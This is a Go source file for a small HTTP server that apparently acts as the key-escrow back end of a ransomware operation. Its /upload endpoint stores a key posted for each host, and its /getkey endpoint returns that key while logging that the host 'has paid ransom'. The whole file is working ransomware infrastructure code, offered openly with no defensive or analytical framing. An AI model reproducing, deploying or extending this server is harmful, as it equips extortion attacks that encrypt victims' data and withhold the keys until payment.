package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/joho/godotenv"
)

func main() {
	err := godotenv.Load()
	if err != nil {
		log.Fatal("Error loading .env file")
	}

	address := os.Getenv("IP_ADDRESS")
	port := os.Getenv("PORT")

	http.HandleFunc("/upload", upload)
	http.HandleFunc("/getkey", getKey)

	fmt.Println("Listening on " + address + ":" + port)
	log.Fatal(http.ListenAndServe(address+":"+port, nil))
}

func getKey(w http.ResponseWriter, r *http.Request) {

	fileName := strings.Split(r.Host, ":")[0] + ".key"
	file, err := os.Open(fileName)
	if err != nil {
		http.Error(w, "Error opening file", http.StatusInternalServerError)
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	key, err := io.ReadAll(file)
	if err != nil {
		http.Error(w, "Error reading file", http.StatusInternalServerError)
		fmt.Println("Error reading file:", err)
		return
	}

	_, err = w.Write(key)
	if err != nil {
		http.Error(w, "Error writing response", http.StatusInternalServerError)
		fmt.Println("Error writing response:", err)
		return
	}

	fmt.Println(strings.Split(r.Host, ":")[0] + " has paid ransom, therefore the key has been sent.")
}

func upload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	key := r.FormValue("key")

	fileName := strings.Split(r.Host, ":")[0] + ".key"

	file, err := os.Create(fileName)
	if err != nil {
		http.Error(w, "Error creating file", http.StatusInternalServerError)
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	_, err = io.WriteString(file, key)
	if err != nil {
		http.Error(w, "Error writing to file", http.StatusInternalServerError)
		fmt.Println("Error writing to file:", err)
		return
	}
}
